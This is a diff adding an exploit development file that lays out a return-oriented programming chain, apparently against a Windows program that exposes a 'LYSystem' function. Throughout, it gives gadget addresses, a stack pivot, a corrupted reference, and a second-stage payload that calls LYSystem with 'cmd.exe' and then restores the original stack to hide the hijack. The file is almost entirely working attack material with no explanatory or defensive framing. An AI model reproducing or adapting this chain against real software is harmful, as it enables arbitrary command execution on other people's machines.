@@ -1,0 +1,86 @@
+----------------------------------------------------------------------------------------------------------------------------------
+%gst == 0040b931 sp == 0052d894 ; ctx: 188 gdt:5395 
+ooooosoo 004c286c 77e30f66 1    52d890         1    541714         0    12f180        6c         0  77e30f66       246    4c286e         0         0    5416b4  ffffffff    52d810        3f         0    12f1bc
+0x0040b931	: 	xchg eax, esp ; ret
+
+1.1 modify reference @4c2866 (c1c66): 004cd1ac -> 52d88c
+2.1 pad data @52d88c(12c68c): 	-> 0040b931 : xchg eax, esp ; ret	#sp will be 0052d890 (12c690) 
+2.2 pad data @0052d890 (12c690):
+0x004055c8 	: 	pop esp; ret
+515D28		: 	#p2 spurious stack;
+3.1 pad data @515D28(114d28): payload1
+
+
+#allocate a buffer for p2 on the original stack
+0x0044a4b8	:	add eax, -0x30 ; ret
+0x004c2704	:	xchg eax, edi ; ret
+
+#fix modified content
+0x00401be5 	: 	pop ecx ; ret
+0x0052d88c	:   #modified data buffer
+0x004055a8	:	pop eax ; ret
+0x004cd1ac 	:   #backup data 1
+0x004c742c	:	xor edx, edx ; ret
+0x0048ecf5	:	mov dword ptr [ecx + edx*4], eax ; ret	
+0x004055a8	:	pop eax ; ret
+0x0052d810 	:   #backup data 2
+0x0044c934	:	inc edx ; ret
+0x0048ecf5	:	mov dword ptr [ecx + edx*4], eax ; ret
+0x004055a8	:	pop eax ; ret
+0x0052d850 	:   #backup data 3
+0x0044c934	:	inc edx ; ret
+0x0048ecf5	:	mov dword ptr [ecx + edx*4], eax ; ret
+
+#start to generate p2
+0x00405f6f	: 	mov eax, edi ; ret
+0x0042218b	:	xchg eax, ecx ; ret
+
+#p2 gadget: invoke LYSystem
+0x004055a8	:	pop eax ; ret
+0x00472b3d	:	#jmp ecx
+0x004c742c	:	xor edx, edx ; ret
+0x0048ecf5	:	mov dword ptr [ecx + edx*4], eax ; ret	
+#p2 data: LYSystem return
+0x004055a8	:	pop eax ; ret
+0x00403f21 	: 	#add esp, 4 ; ret
+0x0044c934	:	inc edx ; ret
+0x0048ecf5	:	mov dword ptr [ecx + edx*4], eax ; ret	
+#p2 data: LYSystem parameter
+0x004055a8	:	pop eax ; ret
+0x004fd184	:	#cmd.exe
+0x0044c934	:	inc edx ; ret
+0x0048ecf5	:	mov dword ptr [ecx + edx*4], eax ; ret	
+
+#p2 gadget: restore the original stack pointer
+0x004055a8	:	pop eax ; ret
+0x0040f753 	: 	#add esp, 0x1c ; ret
+0x0044c934	:	inc edx ; ret
+0x0048ecf5	:	mov dword ptr [ecx + edx*4], eax ; ret	
+
+#p2 gadget: invoke orignial function pointer
+0x00434f63 	:	pop edx ; jle 0x434fa1 ; xor eax, eax ; ret
+0x0000000b	:	#top of origninal stack
+0x004055a8	:	pop eax ; ret
+0x004ad881 	: 	#jmp edi
+0x0048ecf5	:	mov dword ptr [ecx + edx*4], eax ; ret
+
+#fix original stack
+0x0044c934	:	inc edx ; ret
+0x00434f63 	:	pop edx ; jle 0x434fa1 ; xor eax, eax ; ret
+0x00000011	:	# parameter
+0x004055a8	:	pop eax ; ret
+0x0052d810	:	#
+0x0048ecf5	:	mov dword ptr [ecx + edx*4], eax ; ret
+
+#restore edi
+0x004055a8	:	pop eax ; ret
+0x004cd1ac 	:   #backup data 1
+0x00431036 	: 	mov eax, dword ptr [eax] ; ret
+0x004c2704	:	xchg eax, edi ; ret
+
+#prepare to run p2
+0x0042218b	: 	xchg eax, ecx ; ret
+0x00401be5	:	pop ecx ; ret
+0x00498180	:	#LYSystem
+0x0040b931	: 	xchg eax, esp ; ret
+
